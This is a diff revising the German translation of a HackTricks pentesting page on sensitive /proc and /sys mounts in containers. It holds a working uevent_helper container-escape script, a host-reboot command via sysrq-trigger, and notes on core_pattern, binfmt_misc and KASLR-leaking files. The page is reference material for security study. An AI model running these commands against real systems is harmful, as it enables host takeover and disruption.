@@ -9,16 +9,16 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 * Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks in PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
 
 </details>
 
-<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
-Die Offenlegung von `/proc` und `/sys` ohne ordnungsgemäße Namespace-Isolierung birgt erhebliche Sicherheitsrisiken, einschließlich einer Vergrößerung der Angriffsfläche und der Offenlegung von Informationen. Diese Verzeichnisse enthalten sensible Dateien, die bei falscher Konfiguration oder Zugriff durch einen nicht autorisierten Benutzer zu einem Container-Ausbruch, einer Host-Änderung oder zur Bereitstellung von Informationen führen können, die weitere Angriffe unterstützen. Beispielsweise kann das falsche Einhängen von `-v /proc:/host/proc` den AppArmor-Schutz aufgrund seiner pfadbasierten Natur umgehen und `/host/proc` ungeschützt lassen.
+Die Offenlegung von `/proc` und `/sys` ohne ordnungsgemäße Namespace-Isolierung birgt erhebliche Sicherheitsrisiken, einschließlich einer Vergrößerung der Angriffsfläche und der Offenlegung von Informationen. Diese Verzeichnisse enthalten sensible Dateien, die bei falscher Konfiguration oder Zugriff durch einen nicht autorisierten Benutzer zu einem Container-Ausbruch, einer Host-Modifikation oder zur Bereitstellung von Informationen führen können, die weitere Angriffe unterstützen. Beispielsweise kann das falsche Einhängen von `-v /proc:/host/proc` den AppArmor-Schutz aufgrund seiner pfadbasierten Natur umgehen und `/host/proc` ungeschützt lassen.
 
 **Weitere Details zu jeder potenziellen Schwachstelle finden Sie unter** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
@@ -31,7 +31,7 @@ Dieses Verzeichnis ermöglicht den Zugriff auf die Änderung von Kernelvariablen
 #### **`/proc/sys/kernel/core_pattern`**
 
 * Beschrieben in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-* Ermöglicht die Definition eines Programms zur Ausführung bei der Generierung von Core-Dateien mit den ersten 128 Bytes als Argumente. Dies kann zu einer Codeausführung führen, wenn die Datei mit einem Pipe-Zeichen `|` beginnt.
+* Ermöglicht die Definition eines Programms, das bei der Generierung von Core-Dateien mit den ersten 128 Bytes als Argumenten ausgeführt werden soll. Dies kann zu einer Codeausführung führen, wenn die Datei mit einem Pipe-Zeichen `|` beginnt.
 *   **Beispiel für Test und Ausnutzung**:
 
 ```bash
@@ -53,8 +53,8 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Zugriff auf modprobe überprüfen
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-* Referenziert in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-* Ein globaler Schalter, der steuert, ob der Kernel bei einem OOM-Zustand in Panik gerät oder den OOM-Killer aufruft.
+* Bezugnahme auf [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Ein globaler Schalter, der steuert, ob der Kernel bei einem OOM-Zustand in den Panikmodus wechselt oder den OOM-Killer aufruft.
 
 #### **`/proc/sys/fs`**
 
@@ -63,7 +63,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Zugriff auf modprobe überprüfen
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-* Ermöglicht die Registrierung von Interpretern für nicht native Binärformate basierend auf ihrer Magiezahl.
+* Ermöglicht die Registrierung von Interpretern für nicht native Binärformate anhand ihrer Magiezahl.
 * Kann zu Privilegieneskalation oder Root-Shell-Zugriff führen, wenn `/proc/sys/fs/binfmt_misc/register` beschreibbar ist.
 * Relevantes Exploit und Erklärung:
 * [Rootkit auf einfache Art über binfmt\_misc](https://github.com/toffan/binfmt\_misc)
@@ -87,21 +87,21 @@ echo b > /proc/sysrq-trigger # Startet den Host neu
 
 #### **`/proc/kmsg`**
 
-* Stellt Kernelringpuffermeldungen bereit.
+* Zeigt Kernelringpuffermeldungen an.
 * Kann bei Kernel-Exploits, Adresslecks und der Bereitstellung sensibler Systeminformationen helfen.
 
 #### **`/proc/kallsyms`**
 
-* Listet Kernel exportierte Symbole und deren Adressen auf.
+* Listet exportierte Kernel-Symbole und deren Adressen auf.
 * Wesentlich für die Entwicklung von Kernel-Exploits, insbesondere zur Überwindung von KASLR.
 * Adressinformationen sind mit `kptr_restrict` auf `1` oder `2` beschränkt.
 * Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/[pid]/mem`**
 
-* Interagiert mit dem Kernel-Speichergerät `/dev/mem`.
+* Kommuniziert mit dem Kernel-Speichergerät `/dev/mem`.
 * Historisch anfällig für Privilegieneskalationsangriffe.
-* Mehr unter [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Mehr dazu in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
 
@@ -122,13 +122,13 @@ echo b > /proc/sysrq-trigger # Startet den Host neu
 
 #### **`/proc/sched_debug`**
 
-* Gibt Informationen zur Prozessplanung zurück und umgeht PID-Namensraumschutzmaßnahmen.
-* Offenbart Prozessnamen, IDs und cgroup-Bezeichner.
+* Gibt Informationen zur Prozessplanung aus, um die PID-Namensraumschutzmaßnahmen zu umgehen.
+* Zeigt Prozessnamen, IDs und cgroup-Bezeichner an.
 
 #### **`/proc/[pid]/mountinfo`**
 
 * Bietet Informationen über Einhängepunkte im Einhängepunkt-Namensraum des Prozesses.
-* Offenbart den Speicherort des Container-`rootfs` oder des Images.
+* Zeigt den Speicherort des Container-`rootfs` oder des Images an.
 
 ### sys-Schwachstellen
 
@@ -138,32 +138,32 @@ echo b > /proc/sysrq-trigger # Startet den Host neu
 * Das Schreiben in `/sys/kernel/uevent_helper` kann beliebige Skripte bei `uevent`-Auslösern ausführen.
 *   **Beispiel für Ausnutzung**: %%%bash
 
-### Erstellt ein Payload
+#### Erstellt eine Nutzlast
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-### Ermittelt den Hostpfad aus dem OverlayFS-Einhängepunkt für den Container
+#### Ermittelt den Hostpfad aus dem OverlayFS-Einhängepunkt für den Container
 
 host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-### Setzt uevent\_helper auf bösartigen Helfer
+#### Setzt uevent\_helper auf bösartigen Helfer
 
 echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
-### Löst ein uevent aus
+#### Löst ein uevent aus
 
 echo change > /sys/class/mem/null/uevent
 
-### Liest die Ausgabe
+#### Liest die Ausgabe
 
 cat /output %%%
 #### **`/sys/class/thermal`**
 
-* Steuert Temperatureinstellungen, was potenziell DoS-Angriffe oder physische Schäden verursachen kann.
+* Steuert Temperatureinstellungen, die potenziell DoS-Angriffe oder physische Schäden verursachen können.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-* Gibt Kernel-Adressen preis, was potenziell KASLR gefährden kann.
+* Gibt Kernel-Adressen preis, was potenziell die KASLR gefährden kann.
 
 #### **`/sys/kernel/security`**
 
@@ -186,7 +186,7 @@ cat /output %%%
 * [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
 * [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
 
-<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
@@ -196,7 +196,7 @@ cat /output %%%
 
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks in PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
